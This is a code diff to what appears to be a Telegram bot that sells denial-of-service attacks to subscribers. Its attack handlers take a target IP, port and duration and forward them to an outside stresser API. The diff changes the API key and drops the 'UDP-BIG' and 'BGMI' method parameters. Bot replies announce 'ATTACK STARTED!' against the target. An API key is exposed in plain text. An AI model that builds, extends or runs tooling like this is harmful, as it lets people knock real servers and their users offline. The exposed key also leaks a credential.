@@ -23,7 +23,8 @@ bot = telebot.TeleBot(config['token'])
 #API_URL = "https://retrostress.net/api/start"
 API_URL = "https://bgmibotv2.onrender.com/hit"
 AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
-KEY_API= "6378cea5c08195f4c92db7b8fe80966daa91cc20f5eb3fda160a815d86c9f348"
+#KEY_API= "6378cea5c08195f4c92db7b8fe80966daa91cc20f5eb3fda160a815d86c9f348"
+KEY_API= "DRX_POWER_ULTRA_V4"
 
 # Database files
 KEYS_FILE = "keys.json"
@@ -533,7 +534,7 @@ def attack(m):
     ip, port, attack_time = args[1], args[2], args[3]
     
     try:
-        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=UDP-BIG", timeout=10)
+        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}", timeout=10)
         data = response.json()
         if data.get("success"):
             
@@ -587,7 +588,7 @@ You do not have an active subscription.
 
     try:
         response = requests.get(
-            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=UDP-BIG",
+            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}",
             timeout=10
         )
 
@@ -712,7 +713,7 @@ def attack(m):
     ip, port, attack_time = args[1], args[2], args[3]
     
     try:
-        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=BGMI", timeout=10)
+        response = requests.get(f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}", timeout=10)
         data = response.json()
         if data.get("success"):
             bot.reply_to(m, f"🚀 **ATTACK STARTED!**\nType: BGMI\n🎯 Target: `{ip}:{port}`\n🕒 Time: {attack_time}s\n💎 Power: DRX ULTRA\n📶 Status: API CONNECTED ✅")
@@ -764,7 +765,7 @@ You do not have an active subscription.
 
     try:
         response = requests.get(
-            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}&method=BGMI",
+            f"{API_URL}?key={KEY_API}&target={ip}&port={port}&time={attack_time}",
             timeout=10
         )
 
